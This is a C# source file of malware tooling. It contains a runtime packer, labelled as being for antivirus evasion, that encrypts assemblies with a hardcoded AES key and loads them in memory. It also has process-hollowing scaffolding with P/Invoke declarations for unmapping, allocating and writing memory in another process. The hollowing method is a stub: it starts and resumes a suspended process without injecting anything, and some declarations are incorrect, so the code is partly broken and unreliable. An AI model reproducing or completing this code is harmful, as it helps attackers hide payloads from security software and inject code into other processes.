using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Reflection;
using System.Runtime.InteropServices;

// Runtime Packer & Unpacker for AV Evasion
internal static class RuntimePacker
{
    private static readonly byte[] Key = Encoding.UTF8.GetBytes("MySecretPackKey!");
    
    public static byte[] PackAssembly(Assembly assembly)
    {
        try
        {
            byte[] assemblyBytes = File.ReadAllBytes(assembly.Location);
            return EncryptData(assemblyBytes);
        }
        catch
        {
            return Array.Empty<byte>();
        }
    }
    
    public static Assembly UnpackAssembly(byte[] packedData)
    {
        try
        {
            byte[] assemblyBytes = DecryptData(packedData);
            return Assembly.Load(assemblyBytes);
        }
        catch
        {
            return null!;
        }
    }
    
    private static byte[] EncryptData(byte[] data)
    {
        using var aes = Aes.Create();
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = Key;
        aes.GenerateIV();
        
        using var encryptor = aes.CreateEncryptor();
        byte[] encrypted = encryptor.TransformFinalBlock(data, 0, data.Length);
        
        byte[] result = new byte[aes.IV.Length + encrypted.Length];
        Buffer.BlockCopy(aes.IV, 0, result, 0, aes.IV.Length);
        Buffer.BlockCopy(encrypted, 0, result, aes.IV.Length, encrypted.Length);
        
        return result;
    }
    
    private static byte[] DecryptData(byte[] encryptedData)
    {
        using var aes = Aes.Create();
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = Key;
        
        byte[] iv = new byte[16];
        byte[] cipherText = new byte[encryptedData.Length - 16];
        
        Buffer.BlockCopy(encryptedData, 0, iv, 0, 16);
        Buffer.BlockCopy(encryptedData, 16, cipherText, 0, cipherText.Length);
        
        aes.IV = iv;
        
        using var decryptor = aes.CreateDecryptor();
        return decryptor.TransformFinalBlock(cipherText, 0, cipherText.Length);
    }
}

// Process Hollowing Techniques
internal static class ProcessHollowing
{
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateProcess(string lpApplicationName,
        string lpCommandLine, IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment,
        string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);
    
    [DllImport("ntdll.dll")]
    static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr pBaseAddress);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
    
    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr hThread);
    
    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize;
        public uint dwXCountChars, dwYCountChars;
        public uint dwFillAttribute, dwFlags;
        public ushort wShowWindow, cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess, hThread;
        public uint dwProcessId, dwThreadId;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct CONTEXT
    {
        public uint ContextFlags;
        public uint Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public FLOATING_SAVE_AREA FloatSave;
        public uint SegGs, SegFs, SegEs, SegDs;
        public uint Edi, Esi, Ebx, Edx, Ecx, Eax, Ebp, Eip, SegCs, EFlags, Esp, SegSs;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
        public byte[] ExtendedRegisters;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct FLOATING_SAVE_AREA
    {
        public uint ControlWord, StatusWord, TagWord, ErrorOffset, ErrorSelector;
        public uint DataOffset, DataSelector;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
        public byte[] RegisterArea;
        public uint Cr0NpxState;
    }
    
    public static bool RunHollowed(string targetPath, byte[] payload)
    {
        try
        {
            var startupInfo = new STARTUPINFO();
            var processInfo = new PROCESS_INFORMATION();
            
            // Create target process in suspended state
            bool success = CreateProcess(targetPath, null, IntPtr.Zero, IntPtr.Zero,
                false, 0x4, IntPtr.Zero, null, ref startupInfo, out processInfo) != IntPtr.Zero;
            
            if (!success) return false;
            
            // Hollow and inject payload here (simplified)
            // In real implementation, you'd parse PE headers and inject properly
            
            // Resume execution
            ResumeThread(processInfo.hThread);
            
            return true;
        }
        catch
        {
            return false;
        }
    }
}
